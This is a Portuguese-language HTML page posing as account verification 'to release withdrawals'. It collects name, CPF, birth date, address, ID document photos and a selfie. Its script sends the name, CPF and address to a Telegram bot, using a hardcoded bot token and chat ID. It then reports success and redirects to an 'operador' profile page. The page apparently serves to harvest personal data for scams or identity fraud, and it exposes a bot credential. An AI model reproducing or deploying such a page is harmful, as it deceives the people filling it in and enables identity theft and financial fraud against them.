<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verificação de Conta</title>

<link href="https://cdn.jsdelivr.net/npm/remixicon/fonts/remixicon.css" rel="stylesheet">

<style>
body{
  margin:0;
  font-family:"Segoe UI";
  background:#050505;
  color:#fff;
}

.container{
  max-width:720px;
  margin:auto;
  padding:25px;
}

.title{font-size:24px;font-weight:600;}
.sub{font-size:13px;color:#9ca3af;margin-bottom:15px;}

.card{
  background:#0a0a0a;
  padding:16px;
  border-radius:14px;
  margin-top:15px;
  border:1px solid rgba(255,255,255,0.05);
}

.label{font-size:12px;color:#9ca3af;}

input{
  width:100%;
  padding:11px;
  margin-top:6px;
  margin-bottom:10px;
  border-radius:10px;
  border:1px solid rgba(255,255,255,0.05);
  background:#050505;
  color:#fff;
}

.row{display:flex;gap:10px;}

.upload{
  border:1px dashed rgba(255,255,255,0.1);
  padding:15px;
  text-align:center;
  border-radius:12px;
  cursor:pointer;
}

.upload:hover{
  border-color:#3b82f6;
}

.preview{
  width:100%;
  margin-top:10px;
  border-radius:10px;
}

.btn{
  width:100%;
  padding:15px;
  margin-top:20px;
  border:none;
  border-radius:12px;
  background:linear-gradient(135deg,#2563eb,#3b82f6);
  color:#fff;
  font-size:14px;
  cursor:pointer;
}

#toast{
  position:fixed;
  bottom:25px;
  right:25px;
  background:#0f0f0f;
  padding:14px 18px;
  border-radius:12px;
  border:1px solid rgba(255,255,255,0.08);
  opacity:0;
  transform:translateY(20px);
  transition:0.3s;
}

#toast.show{
  opacity:1;
  transform:translateY(0);
}
</style>
</head>

<body>

<div class="container">

  <div class="title">Verificação de Conta</div>
  <div class="sub">Confirme sua identidade para liberar saques</div>

  <div class="card">
    <div class="label">Dados pessoais</div>
    <input id="nome" placeholder="Nome completo">

    <div class="row">
      <input id="cpf" placeholder="CPF">
      <input id="nascimento" type="date">
    </div>
  </div>

  <div class="card">
    <div class="label">Endereço</div>

    <input id="rua" placeholder="Rua">

    <div class="row">
      <input id="numero" placeholder="Número">
      <input id="cidade" placeholder="Cidade">
    </div>

    <input id="cep" placeholder="CEP">
  </div>

  <!-- UPLOADS -->
  <div class="card">
    <div class="label">Documento (Frente)</div>
    <div class="upload" onclick="docFront.click()">Enviar frente</div>
    <input type="file" id="docFront" accept="image/*" hidden onchange="preview(this,'frontPreview')">
    <img id="frontPreview" class="preview">
  </div>

  <div class="card">
    <div class="label">Documento (Verso)</div>
    <div class="upload" onclick="docBack.click()">Enviar verso</div>
    <input type="file" id="docBack" accept="image/*" hidden onchange="preview(this,'backPreview')">
    <img id="backPreview" class="preview">
  </div>

  <div class="card">
    <div class="label">Selfie</div>
    <div class="upload" onclick="selfie.click()">Enviar selfie</div>
    <input type="file" id="selfie" accept="image/*" hidden onchange="preview(this,'selfiePreview')">
    <img id="selfiePreview" class="preview">
  </div>

  <button class="btn" onclick="enviar()">Enviar para análise</button>

</div>

<div id="toast"></div>

<script>

let usuario = localStorage.getItem("usuario") || "user";

/* 🔥 CONFIG TELEGRAM */
const TOKEN = "8616002020:AAGMiTHbWLNN-o6dz_rJ6hEcUX12RKnbFuA";
const CHAT_ID = "7847311143";

/* preview */
function preview(input,id){
  let file = input.files[0];

  if(file){
    let reader = new FileReader();

    reader.onload = function(e){
      document.getElementById(id).src = e.target.result;
    };

    reader.readAsDataURL(file);
  }
}

function toast(msg){
  let t = document.getElementById("toast");
  t.innerText = msg;
  t.classList.add("show");
  setTimeout(()=>t.classList.remove("show"),2000);
}

function enviar(){

  let frente = document.getElementById("frontPreview").src;
  let verso = document.getElementById("backPreview").src;
  let selfie = document.getElementById("selfiePreview").src;

  if(!nome.value || !cpf.value){
    toast("Preencha nome e CPF");
    return;
  }

  let dados = {
    nome: nome.value,
    cpf: cpf.value,
    nascimento: nascimento.value,
    rua: rua.value,
    numero: numero.value,
    cidade: cidade.value,
    cep: cep.value,
    frente: frente || "",
    verso: verso || "",
    selfie: selfie || "",
    status: "analise"
  };

  localStorage.setItem("kyc_"+usuario, JSON.stringify(dados));

  /* 🔥 ENVIO PRO BOT */
  let mensagem =
`Usuário: ${usuario}
Nome: ${dados.nome}
CPF: ${dados.cpf}

Endereço:
${dados.rua}, ${dados.numero}
${dados.cidade} - ${dados.cep}

Data: ${new Date().toLocaleString()}`;

  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id: CHAT_ID,
      text: mensagem
    })
  });

  toast("Enviado com sucesso");

  setTimeout(()=>{
    if(window.parent && window.parent.document.getElementById("frame")){
      window.parent.document.getElementById("frame").src = "perfil-operador.html";
    }else{
      window.location.href = "perfil-operador.html";
    }
  },1500);
}

</script>

</body>
</html>
